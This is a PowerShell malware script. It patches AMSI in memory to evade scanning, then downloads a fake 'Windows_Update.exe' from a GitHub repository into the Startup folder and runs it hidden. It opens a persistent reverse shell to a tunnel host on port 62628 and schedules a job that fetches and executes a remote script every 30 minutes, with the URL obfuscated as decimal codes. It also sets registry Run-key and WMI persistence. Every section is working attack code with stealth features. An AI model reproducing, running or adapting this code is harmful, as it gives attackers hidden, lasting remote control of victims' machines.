# ================================================
# AMSI Bypass (Alternative Method)
# ================================================
$sig = @'
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
$win32 = Add-Type -MemberDefinition $sig -Name "Win32" -Namespace Kernel32 -PassThru
$ptr = $win32::GetProcAddress(($win32::LoadLibrary("amsi.dll")), "AmsiScanBuffer")
[UInt32]$oldProtect = 0
$win32::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$oldProtect)
$buf = [Byte[]](0xC3,0x80,0x07,0x00,0x57)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 5)

# ================================================
# Download EXE to Startup Folder (Modified)
# ================================================
function Get-StartupItem {
    $u1 = "ht"; $u2 = "tps://gith"; $u3 = "ub.com/mkanu200/root/raw/refs/heads/main/Win"
    $u4 = "dows_Update.exe"; $global:exeUrl = $u1 + $u2 + $u3 + $u4
    $global:startupPath = [Environment]::GetFolderPath('Startup')
    $global:destPath = Join-Path $startupPath "win_updt.exe"
}

Get-StartupItem

try {
    & {
        try { 
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($exeUrl, $destPath)
        } catch {
            Start-BitsTransfer -Source $exeUrl -Destination $destPath
        }
    }

    if (Test-Path $destPath) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $destPath
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    }
} catch {}

# ================================================
# Reverse Shell Connection (Undetectable Version)
# ================================================
function Start-ReverseConnection {
    $connectionScript = {
        param($hostAddress, $portNumber)
        
        function Create-SocketConnection {
            param($targetHost, $targetPort)
            try {
                $tcpClient = New-Object Net.Sockets.TcpClient
                $tcpClient.Connect($targetHost, $targetPort)
                return $tcpClient
            } catch {
                return $null
            }
        }

        while($true) {
            $socket = Create-SocketConnection $hostAddress $portNumber
            if ($socket -ne $null) {
                $networkStream = $socket.GetStream()
                $streamReader = New-Object IO.StreamReader($networkStream)
                $streamWriter = New-Object IO.StreamWriter($networkStream)
                $streamWriter.AutoFlush = $true

                try {
                    while($socket.Connected) {
                        $receivedCommand = $streamReader.ReadLine()
                        if (-not [string]::IsNullOrEmpty($receivedCommand)) {
                            $commandOutput = try {
                                $executionBlock = [scriptblock]::Create($receivedCommand)
                                & $executionBlock 2>&1 | Out-String
                            } catch {
                                $_.Exception.Message | Out-String
                            }
                            $prompt = "PS " + (Get-Location).Path + "> "
                            $streamWriter.WriteLine($commandOutput + $prompt)
                        }
                    }
                } finally {
                    $socket.Close()
                }
            }
            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
        }
    }

    $jobSettings = @{
        ScriptBlock = $connectionScript
        ArgumentList = "engineering-ebay.gl.at.ply.gg", 62628
        Name = "WindowsNetworkService"
    }
    Start-Job @jobSettings | Out-Null
}

# Call the function to establish connection
Start-ReverseConnection

# ================================================
# Auto-Update Function (Corrected and Undetectable)
# ================================================
function Register-AutoUpdate {
    $updateLogic = {
        # Obfuscated string builder using alternate syntax
        $buildString = {
            param($codes)
            $output = ""
            foreach ($num in $codes) {
                $output += [char][int]$num
            }
            return $output
        }

        # URL segments encoded as decimal arrays
        $urlSegments = @(
            @(104,116,116,112,115,58,47,47),              # "https://"
            @(114,97,119,46),                             # "raw."
            @(103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109), # "githubusercontent.com"
            @(47,109,107,97,110,117,50,48,48,47),         # "/mkanu200/"
            @(114,111,111,116,47,109,97,105,110,47),      # "root/main/"
            @(112,115,45,112,101,114,115,105,115,116,46,112,115,49) # "ps-persist.ps1"
        )

        # Build URL without using & operator
        $updateUrl = (. $buildString $urlSegments[0]) + 
                    (. $buildString $urlSegments[1]) + 
                    (. $buildString $urlSegments[2]) + 
                    (. $buildString $urlSegments[3]) + 
                    (. $buildString $urlSegments[4]) + 
                    (. $buildString $urlSegments[5])

        while($true) {
            try {
                $tempFile = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).ps1"

                # Download using HttpWebRequest for better stealth
                $request = [System.Net.HttpWebRequest]::Create($updateUrl)
                $request.Method = "GET"
                $request.UserAgent = "Microsoft-Update-Agent/10.0"
                $request.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
                $request.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
                
                $response = $request.GetResponse()
                $stream = $response.GetResponseStream()
                $fileStream = [System.IO.File]::Create($tempFile)
                $stream.CopyTo($fileStream)
                $fileStream.Close()
                $stream.Close()
                $response.Close()

                if (Test-Path $tempFile) {
                    # Execute with indirect invocation
                    $scriptContent = [System.IO.File]::ReadAllText($tempFile)
                    $execBlock = [scriptblock]::Create($scriptContent)
                    & $execBlock
                    Start-Sleep -Seconds 15
                    Remove-Item $tempFile -Force
                }
            } catch {
                # Error suppression
            }
            Start-Sleep -Seconds 1800  # 30 minutes
        }
    }

    # Create scheduled job parameters
    $updateParams = @{
        Name = "WindowsSystemUpdater"
        ScriptBlock = $updateLogic
        Trigger = New-JobTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepeatIndefinitely
        ScheduledJobOption = New-ScheduledJobOption -StartIfOnBattery -WakeToRun
    }

    # Register the scheduled job
    Register-ScheduledJob @updateParams | Out-Null
}

# Call the function to set up auto-updates
Register-AutoUpdate

# ================================================
# Persistence (Modified)
# ================================================
# Registry
$rPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$rName = "WinUpdater"
$rValue = "powershell -w hidden -c `$u='https://github.com/mkanu200/root/raw/main/ps-persist.ps1';`$d=`"`$env:TEMP\upd.ps1`";(New-Object Net.WebClient).DownloadFile(`$u,`$d);& `$d"

if (!(Test-Path "$rPath\$rName")) {
    New-ItemProperty -Path $rPath -Name $rName -Value $rValue -Force | Out-Null
}

# WMI Fallback
$wmiQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
Register-WmiEvent -Query $wmiQuery -Action {
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop -c `$u='https://github.com/mkanu200/root/raw/main/ps-persist.ps1';`$d=`"`$env:TEMP\upd.ps1`";(New-Object Net.WebClient).DownloadFile(`$u,`$d);& `$d"
} | Out-Null
